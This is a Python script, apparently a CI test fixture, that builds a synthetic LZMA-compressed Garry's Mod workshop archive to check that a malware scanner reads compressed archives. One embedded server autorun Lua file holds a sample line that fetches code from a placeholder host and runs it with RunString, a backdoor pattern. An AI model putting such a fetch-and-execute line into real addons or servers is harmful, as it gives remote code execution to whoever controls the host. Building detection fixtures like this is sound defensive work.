"""Build a synthetic LZMA-compressed GMA, the way Garry's Mod stores workshop
downloads in garrysmod/cache/workshop/. Used by CI to prove the scanner reads
compressed archives rather than skipping them. Nothing produced here is
functional Lua.

Usage: python make_workshop_gma.py <output.gma>
"""

import lzma
import struct
import sys


def cstring(value):
    return value.encode() + b"\x00"


def build_gma(files):
    header = b"GMAD" + struct.pack("<B", 3) + struct.pack("<QQ", 0, 0) + b"\x00"
    header += cstring("Test Addon") + cstring("description") + cstring("author")
    header += struct.pack("<i", 1)

    body = b""
    for index, (name, data) in enumerate(files):
        header += struct.pack("<I", index + 1)
        header += cstring(name)
        header += struct.pack("<q", len(data))
        header += struct.pack("<I", 0)
        body += data

    return header + struct.pack("<I", 0) + body


def main():
    if len(sys.argv) < 2:
        sys.exit("usage: make_workshop_gma.py <output.gma>")

    archive = build_gma([
        ("lua/autorun/server/sv_init.lua",
         b'http.Fetch("http://example.invalid/stage2", function(b) RunString(b) end)\n'),
        ("lua/autorun/client/cl_hud.lua",
         b'surface.CreateFont("ExampleFont", { font = "Arial", size = 16 })\n'),
        ("materials/example.vmt",
         b'"UnlitGeneric" { "$basetexture" "models/example" }\n'),
    ])

    with open(sys.argv[1], "wb") as out:
        out.write(lzma.compress(archive, format=lzma.FORMAT_ALONE, preset=6))


if __name__ == "__main__":
    main()
